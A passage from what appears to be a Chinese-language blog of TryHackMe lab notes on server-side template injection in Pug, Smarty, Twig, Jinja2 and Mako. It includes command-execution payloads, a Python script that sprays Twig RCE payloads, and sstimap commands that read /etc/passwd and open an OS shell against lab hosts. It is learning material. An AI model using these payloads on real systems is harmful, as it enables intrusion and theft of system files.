<h3 id="Jade-Pug（Node-js）"><a href="#Jade-Pug（Node-js）" class="headerlink" title="Jade&#x2F;Pug（Node.js）"></a><strong>Jade&#x2F;Pug</strong>（Node.js）</h3><p>Pug&#x2F;Jade 评估 <code>#&#123;&#125;</code> 内的 JavaScript 表达式。例如，使用有效负载 <code>#&#123;7*7&#125;</code> 将返回 49<br>Pug&#x2F;Jade 直接允许在其模板中执行 JavaScript，而无需像 {{ }} 这样的额外分隔符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;root.process.mainModule.require(&#x27;child_process&#x27;).spawnSync(&#x27;id&#x27;).stdout)</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701105247.png"></p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;Hello&#x27;|upper&#125;</span><br></pre></td></tr></table></figure>
<p>返回<code>HELLO</code>说明是<code>Smarty</code><br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701110136.png"><br>那直接就是代码注入执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&quot;whoami&quot;)&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701110219.png"></p>
<h4 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h4><p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;Hello&#x27;|upper&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>返回<code>HELLO</code>，说明是twig<br>直接命令执行，他的语法类似python的<code>Jinjia2</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; (_self.env.registerUndefinedFilterCallback(&quot;exec&quot;) or 1) and &quot;id&quot;|filter &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>失败，写脚本测试可用的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ssti.thm:8000/twig/&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: url,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://ssti.thm:8000&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payloads = [</span><br><span class="line">    (<span class="string">&quot;math eval&quot;</span>, <span class="string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;upper filter&quot;</span>, <span class="string">&quot;&#123;&#123;&#x27;abc&#x27;|upper&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;constant PHP_VERSION&quot;</span>, <span class="string">&quot;&#123;&#123;constant(&#x27;PHP_VERSION&#x27;)&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;_self object&quot;</span>, <span class="string">&quot;&#123;&#123;_self&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;env object&quot;</span>, <span class="string">&quot;&#123;&#123;_self.env&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;env.loader&quot;</span>, <span class="string">&quot;&#123;&#123;_self.env.loader&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;register + system&quot;</span>, <span class="string">&quot;&#123;&#123;(_self.env.registerUndefinedFilterCallback(&#x27;system&#x27;) or 1) and &#x27;id&#x27;|system&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;register + exec&quot;</span>, <span class="string">&quot;&#123;&#123;(_self.env.registerUndefinedFilterCallback(&#x27;exec&#x27;) or 1) and &#x27;id&#x27;|exec&#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;attribute register + system&quot;</span>, <span class="string">&quot;&#123;&#123; attribute(_self.env, &#x27;registerUndefinedFilterCallback&#x27;)(&#x27;system&#x27;) &#125;&#125;&#123;&#123; &#x27;id&#x27;|system &#125;&#125;&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;array map system&quot;</span>, <span class="string">&quot;&#123;&#123;[&#x27;whoami&#x27;]|map(&#x27;system&#x27;)|join&#125;&#125;&quot;</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🔍 Starting Twig SSTI detection...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_result</span>(<span class="params">html</span>):</span><br><span class="line">    <span class="comment"># 提取 payload 输出的渲染结果（在 Submit 按钮下面）</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;&lt;/form&gt;\s*([\s\S]+?)\s*&lt;/div&gt;&#x27;</span>, html)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(No output found)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, payload <span class="keyword">in</span> payloads:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;page&quot;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url, data=data, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">        output = extract_result(r.text)</span><br><span class="line">        result_line = <span class="string">f&quot;🧪 <span class="subst">&#123;name:&lt;<span class="number">30</span>&#125;</span> → <span class="subst">&#123;output&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 标记潜在命令执行成功（包含 uid, root, www-data, 用户名等）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> output.lower() <span class="keyword">for</span> keyword <span class="keyword">in</span> [<span class="string">&#x27;uid=&#x27;</span>, <span class="string">&#x27;gid=&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;www-data&#x27;</span>, <span class="string">&#x27;user&#x27;</span>]):</span><br><span class="line">            result_line += <span class="string">&quot;  ✅ [POSSIBLE RCE]&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Unknown&quot;</span> <span class="keyword">in</span> output <span class="keyword">or</span> <span class="string">&quot;exception&quot;</span> <span class="keyword">in</span> output.lower():</span><br><span class="line">            result_line += <span class="string">&quot;  ⚠️  [Error]&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(result_line)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ <span class="subst">&#123;name&#125;</span> → Request failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701111818.png"><br><code>constant()</code>可用<br>经测试，不允许调用函数，只能读取常量值<br>最后就读取了这些没啥用的<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701113311.png"></p>
<h3 id="NodeJS-Pug"><a href="#NodeJS-Pug" class="headerlink" title="NodeJS - Pug"></a>NodeJS - Pug</h3><p>Pug 的安全漏洞主要源于它在模板变量中插入 JavaScript 代码的能力<br>直接注入命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;root.process.mainModule.require(&#x27;child_process&#x27;).spawnSync(&#x27;whoami&#x27;).stdout&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701113528.png"><br>带参数命令，如<code>ls -lah</code>不能直接<code>spawnSync(&#39;ls -lah&#39;)</code>，因为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">spawnSync</span>(command, [args], [options])</span><br></pre></td></tr></table></figure>
<p>所以要</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;root.process.mainModule.require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;, [&#x27;-lah&#x27;]).stdout&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701113747.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;root.process.mainModule.require(&#x27;child_process&#x27;).spawnSync(&#x27;tac&#x27;, [&#x27;7f58571b42d8c477a2f3efa69a681ac3.txt&#x27;]).stdout&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701113923.png"></p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(&quot;__builtins__&quot;).get(&quot;__import__&quot;)(&quot;subprocess&quot;).check_output(&quot;whoami&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701114148.png"><br>带参数命令，根据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.check_output([command, arg1, arg2])</span><br></pre></td></tr></table></figure>
<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(&quot;__builtins__&quot;).get(&quot;__import__&quot;)(&quot;subprocess&quot;).check_output([&#x27;tac&#x27;, &#x27;5d8bea6df83cbb6767a235c4ba54933b.txt&#x27;])&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701143232.png"></p>
<h4 id="mako（sstimap使用）"><a href="#mako（sstimap使用）" class="headerlink" title="mako（sstimap使用）"></a>mako（sstimap使用）</h4><p>直接用自动化工具了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sstimap.py -X POST -u &#x27;http://ssti.thm:8002/mako/&#x27; -d &#x27;page=&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701145015.png"><br>然后读文件，都是代码执行的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sstimap.py -X POST -u &#x27;http://ssti.thm:8002/mako/&#x27; -d &#x27;page=&#x27; -X &#x27;open(&quot;/etc/passwd&quot;).read()&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701150224.png"><br>或者直接拿shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sstimap.py -X POST -u &#x27;http://ssti.thm:8002/mako/&#x27; -d &#x27;page=&#x27; --os-shel</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701153244.png"></p>
<h2 id="纯实践"><a href="#纯实践" class="headerlink" title="纯实践"></a>纯实践</h2><h3 id="抓瞎"><a href="#抓瞎" class="headerlink" title="抓瞎"></a>抓瞎</h3><p>没找到漏洞点，倒是xss的找到一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ssti.thm:8080/admin/clients/edit.php?page=main&amp;client_id=</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709095039.png"><br>感觉应该是测试php<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709095230.png"><br>然后sql注入也找到了<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709095728.png"><br>离谱啊，ssti还没找到点在哪，算了先打完拿东西再看wp<br>md还路径不可写<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709100520.png"></p>
<h3 id="找到ssti"><a href="#找到ssti" class="headerlink" title="找到ssti"></a>找到ssti</h3><p>不对，想起来可以查组件漏洞，直接搜索<code>form tool ssti</code>，找到个<a target="_blank" rel="noopener" href="https://hakaisecurity.io/error-404-your-security-not-found-tales-of-web-vulnerabilities/">文章</a><br>漏洞点是在添加表单那里，然后在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ssti.thm:8080/admin/forms/edit/index.php?form_id=3&amp;page=views</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/6df7bbeb6beee8e82abb06501b730abd.png"><br>直接插语句，然后点一下<code>update</code>，测出是<code>Smarty</code><br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709104142.png"><br>那就直接插<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709104248.png"><br>命令执行成功，那直接跑工具算了，md <code>sstimap</code>没跑出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls ../../../ -a</span><br></pre></td></tr></table></figure>
<p>找到隐藏的文本文件<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709112350.png"><br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250709112450.png"></p>
<h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><strong>可分辨名称 （DN）：</strong> 用作目录中每个条目的唯一标识符，指定从 LDAP 树顶部到条目的路径，例如 <code>cn=John Doe,ou=people,dc=example,dc=com</code><br><strong>对可分辨名称 （RDN）：</strong> 表示目录层次结构中的各个级别，例如 <code>cn=John Doe</code>，其中 <code>cn</code> 代表公用名<br><strong>属性：</strong> 定义目录条目的属性，例如电子邮件地址的 <code>mail=john@example.com</code></p>
<h2 id="过滤器和语法"><a href="#过滤器和语法" class="headerlink" title="过滤器和语法"></a>过滤器和语法</h2><p>相等 （<code>=</code>）、 存在 （<code>=*</code>）、大于 （<code>&gt;=</code>） 和小于 （<code>&lt;=</code>）<br>最重要的运算符之一是通配符 <code>*</code>，它表示与任意数量的字符匹配。此运算符对于制定广泛或部分匹配搜索条件至关重要</p>
<h3 id="带有逻辑运算符的复杂过滤器："><a href="#带有逻辑运算符的复杂过滤器：" class="headerlink" title="带有逻辑运算符的复杂过滤器："></a><strong>带有逻辑运算符的复杂过滤器：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass=user)(|(cn=John*)(cn=Jane*)))</span><br></pre></td></tr></table></figure>
<p>搜索在其对象类中分类为 “user” 且规范名称以 “John” 或 “Jane” 开头的条目</p>
<h2 id="注入基础知识"><a href="#注入基础知识" class="headerlink" title="注入基础知识"></a>注入基础知识</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lan1oc.github.io">lan1oc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lan1oc.github.io/2025/06/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/Injection%20Attacks/">https://lan1oc.github.io/2025/06/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/Injection%20Attacks/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lan1oc.github.io" target="_blank">lan1ocのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/THM%E8%AE%B0%E5%BD%95/">THM记录</a></div><div class="post-share"><div class="social-share" data-image="/img/c1/3.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/18/%E8%AE%B0%E5%BD%95/%E5%BB%BA%E7%AB%99/%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/" title="博客恢复"><img class="cover" src="/img/cover/1.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">博客恢复</div></div><div class="info-2"><div class="info-item-1">格盘忘记备份笔记了如题，没备份，那咋办嘛，数据恢复工具也没扫出来，只能说是格的非常干净了想到有个静态存储库，想着用工具恢复看看 写了个恢复的小工具网上确实有个工具，但是是七年前写的，太辣了，根本用不了，就拷打cursor写了个，恢复的效果还不错恢复后的文章基本保留了我原有的Front-matte就是时间啥的可能有点问题，毕竟主要是根据静态存储库恢复的 嗯稍微研究下了配置项之前为了文章排序的问题，是自己改了主题渲染模板以及写了个js脚本辅助，date: 2025-04-01 16:00:00 updated: 2025-08-14 categories: 学习 tags: - 日常随记 --- # updated判断 在hexo目录下创建脚本文件&#96;scripts&#x2F;custom-i 这记录了，但刚恢复，不想那么麻烦，研究了下配置项，发现。。。。。。本来就有的，设置为updated就行md还是要写插件，要不然就会出现updated的值相同，但是date的值在更早的文章会排在上面，还是要用到date: 2025-04-01 16:00:00 updated:...</div></div></div></a><a class="pagination-related" href="/2025/06/19/%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B06/" title="笔记6---自定义阿里云系统镜像"><img class="cover" src="/img/cover/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">笔记6---自定义阿里云系统镜像</div></div><div class="info-2"><div class="info-item-1">阿里云镜像上传首先，vmware导出ovf然后下载qemu，将导出的文件中的vmdk文件制作成RAW文件 1./qemu-img.exe convert -f vmdk -O raw ../hack-disk1.vmdk ../hack.raw 然后上传就行了 </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/19/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E6%9D%82%E8%B0%88%E4%B8%8E%E5%B9%B3%E5%8F%B0%E8%AF%81%E4%B9%A6/%E3%80%90%E9%9A%8F%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Red%20Team%20Threat%20Intel/" title="【随记】[THM]Red Teaming--Red Team Threat Intel"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-19</div><div class="info-item-2">【随记】[THM]Red Teaming--Red Team Threat Intel</div></div><div class="info-2"><div class="info-item-1">意识流答案这个房间不难，但是有一些意识流的东西，比如Task 7Creating a Threat Intel Driven Campaign的第一个问题能知道是要比对APT 41的网络杀伤链来写答案，但是比对过程。。。。图案和文字我是实在没怎么对上啊，硬写就对了第一个，然后就去看wp了贴个答案吧👇然后就是另一个问题纯属基础不好导致的，首先理解LOLBAS（Living Off The Land Binaries and Scripts）工具是什么：利用系统中已有的合法工具或命令行脚本来执行恶意活动，从而避过传统的防御然后就是对着MITRE中的软件一个个在自己电脑上搜了，毕竟说了是已有的合法工具，然后也是查到了 综上结了吧 </div></div></div></a><a class="pagination-related" href="/2025/05/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%5BTHM%5DWeb%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/" title="[THM]Web Application Pentesting---Authentication  认证"><img class="cover" src="/img/c1/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-28</div><div class="info-item-2">[THM]Web Application Pentesting---Authentication  认证</div></div><div class="info-2"><div class="info-item-1">基础sessioncookie属性Secure - 向浏览器指示 Cookie 只能通过经过验证的 HTTPS 通道传输。如果存在证书错误或使用 HTTP，则不会传输 Cookie 值HTTPOnly - 向浏览器指示客户端 JavaScript 可能无法读取 Cookie 值Expire - 向浏览器指示 Cookie 值何时不再有效，应将其删除SameSite - 向浏览器指示是否可以在跨站点请求中传输 Cookie，以帮助防止 CSRF 攻击 tokenToken-Based Session Management最常见的令牌类型之一是 JSON Web 令牌 （JWT），一般形式 1Authorization: Bearer &lt;token&gt;  以前的盲点浏览器中不仅仅要注意cookie，还要注意本地存储的 JWT它没有使用浏览器的自动 cookie 管理功能，而是依赖于客户端代码来完成该过程。身份验证后，Web 应用程序会在请求正文中提供令牌。然后使用客户端 JavaScript 代码，此令牌将存储在浏览器的 LocalStorage...</div></div></div></a><a class="pagination-related" href="/2025/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Red%20Team%20Recon%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）</div></div><div class="info-2"><div class="info-item-1">内置工具（系统可识别并自下载的）whois一般能查到以下信息： 12345678910Registrar WHOIS server  注册 WHOIS 服务器Registrar URL  注册 URLRecord creation date  记录创建日期Record update date  记录更新日期Registrant contact info and address (unless withheld for privacy)注册人的联系信息和地址（除非出于隐私考虑而保留）Admin contact info and address (unless withheld for privacy)管理员联系信息和地址（除非出于隐私原因而保留）Tech contact info and address (unless withheld for privacy)技术联系信息和地址（除非出于隐私原因而隐瞒）  但一般都会有隐瞒，以我博客为例，基本全隐瞒了 nslookup使用默认 DNS 服务器来获取与域相关的 A 和 AAAA...</div></div></div></a><a class="pagination-related" href="/2025/04/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DLinux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/" title="【学习笔记】[THM]Linux Privilege Escalation(linux提权)"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-11</div><div class="info-item-2">【学习笔记】[THM]Linux Privilege Escalation(linux提权)</div></div><div class="info-2"><div class="info-item-1">信息收集假设已经拿下权限，那就先收集下这台机器的信息 主机名1hostname   系统信息1uname -a   内核版本和其他数据的信息1cat /proc/version   &#x2F;etc&#x2F;issue 系统版本1cat /etc/issue   看进程1234ps -A：查看所有正在运行的进程ps axjf：查看进程树（请参阅下面的树结构，直到运行 ps axjf）ps aux：aux 选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未连接到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。  一般直接用 1ps -aux  看环境变量1env  重点看path变量PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升。 看允许用户使用 root 权限运行哪些命令(鸡肋，要密码)1sudo -l  看用户组1id  也可看其他用户 1id root   &#x2F;etc&#x2F;passwd1cat...</div></div></div></a><a class="pagination-related" href="/2025/02/27/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E7%BA%A2%E9%98%9F/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Intro%20to%20C2%EF%BC%88C2%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Intro to C2（C2服务器搭建）"><img class="cover" src="/img/c1/1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Intro to C2（C2服务器搭建）</div></div><div class="info-2"><div class="info-item-1">设置C2服务器前提条件—下载msf采用一款免费的C2服务器–Armitage，他依赖msf框架，所以还是先下载msf官方给的下载方式 123curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  ./msfinstall  这一步会直接下载好依赖项和msf本身 安装Armitage下载、构建和安装 Armitage1git clone https://gitlab.com/kalilinux/packages/armitage.git &amp;&amp; cd armitage  然后运行构建脚本（在这一步之前首先要先装有java，版本不能太高java11就行sudo apt install openjdk-11-jdk） 1bash...</div></div></div></a><a class="pagination-related" href="/2025/04/22/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DWindows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/" title="【学习笔记】[THM]Windows Privilege Escalation(windows提权)"><img class="cover" src="/img/c1/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-22</div><div class="info-item-2">【学习笔记】[THM]Windows Privilege Escalation(windows提权)</div></div><div class="info-2"><div class="info-item-1">基本知识点Administrators组可以更改系统配置SYSTEM &#x2F; LocalSystem 帐户比管理员用户具有更多的权限Local Service用于以“最低”权限运行 Windows 服务的默认帐户。它将通过网络使用匿名连接Network Service用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证 收集密码的常用位置无人值守的 Windows 安装在大量主机上安装 Windows 时，管理员可以使用 Windows...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/joker.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">lan1oc</div><div 